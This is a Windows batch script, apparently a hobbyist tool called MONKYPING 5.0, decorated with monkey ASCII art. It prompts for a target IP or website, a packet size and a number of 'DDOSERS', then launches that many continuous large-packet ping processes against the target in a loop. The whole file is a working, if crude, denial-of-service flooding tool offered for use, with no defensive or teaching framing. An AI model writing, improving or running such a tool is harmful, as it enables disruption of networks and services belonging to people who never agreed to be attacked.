@echo off
Title MONKYPING5.0
color 2
echo         MONKYPING 5.0 
echo            __,__
echo   .--.  .-"     "-.  .--.
echo  / .. \/  .-. .-.  \/ .. \
echo ^| ^|  '^|  /   Y   \  ^|'  ^| ^|
echo ^| \   \  \ 0 ^| 0 /  /   / ^|
echo  \ '- ,\.-"`` ``"-./, -' /
echo   `'-' /_   ^ ^   _\ '-'`
echo       ^|  \._   _./  ^|
echo       \   \ `~` /   /
echo        '._ '-=-' _.'
echo           '~---~'
set /p D= IP/WEBSITE:
 
:START
color 0e
cls
echo (Max Amount 65500)
echo.
set /p O= PACKET SIZE:
 
color 0c
cls
echo ===============================================================================
echo =                          Use At Your Own Risk!                              =
echo ===============================================================================
echo                                                                 
echo            __,__
echo   .--.  .-"     "-.  .--.
echo  / .. \/  .-. .-.  \/ .. \
echo ^| ^|  '^|  /   Y   \  ^|'  ^| ^|
echo ^| \   \  \ 0 ^| 0 /  /   / ^|
echo  \ '- ,\.-"`` ``"-./, -' /
echo   `'-' /_   ^ ^   _\ '-'`
echo       ^|  \._   _./  ^|
echo       \   \ `~` /   /
echo        '._ '-=-' _.'
echo           '~---~'
echo (There is no limit, but we don't recommend setting the value too high or else your computer might not be able to handle it.)
echo.
set /p S= HOW MAN DDOSERS:
cls
pause

:ping
FOR /L %%S IN (1, 1, %S%) DO start ping %D% -t -l %O%
goto START

:END
echo